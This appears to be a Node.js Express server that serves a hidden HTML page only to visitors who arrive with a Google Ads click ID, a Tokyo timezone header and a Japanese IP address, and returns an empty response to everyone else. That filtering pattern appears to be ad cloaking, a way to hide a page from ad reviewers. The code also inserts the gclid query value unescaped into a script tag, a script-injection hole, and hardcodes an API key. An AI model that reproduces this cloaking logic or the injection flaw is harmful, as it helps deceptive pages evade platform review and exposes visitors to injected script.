import express from "express";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";

const app = express();

const JAPAN_TIMEZONE = "Asia/Tokyo";
const IPWHOIS_KEY = process.env.IPWHOIS_KEY || "C8sZnLEBIwQVuMA4";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ----------------------
// CORS
// ----------------------
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://toyo-japan.online");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-client-timezone");
  res.setHeader("Access-Control-Allow-Methods", "GET");
  next();
});

// ----------------------
// Client IP
// ----------------------
function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress;
}

// ----------------------
// Route
// ----------------------
app.get("/getData", async (req, res) => {
  const gclid = req.query.gclid || "";
  const timezone = req.headers["x-client-timezone"] || "";

  if (!gclid) return res.status(204).end();
  if (timezone !== JAPAN_TIMEZONE) return res.status(204).end();

  const ip = getClientIp(req);

  try {
    // ✅ Native fetch (Node 18+)
    const ipRes = await fetch(
      `https://ipwhois.pro/${ip}?key=${IPWHOIS_KEY}`
    );
    const ipData = await ipRes.json();

    if (ipData.country_code !== "JP") {
      return res.status(204).end();
    }

    const htmlPath = path.join(__dirname, "test", "index.html");
    let html = fs.readFileSync(htmlPath, "utf8");

    html = html.replace(
      "</head>",
      `<script>window.gclid="${gclid}"</script></head>`
    );

    res.setHeader("Content-Type", "text/html");
    return res.send(html);

  } catch (e) {
    return res.status(204).end();
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
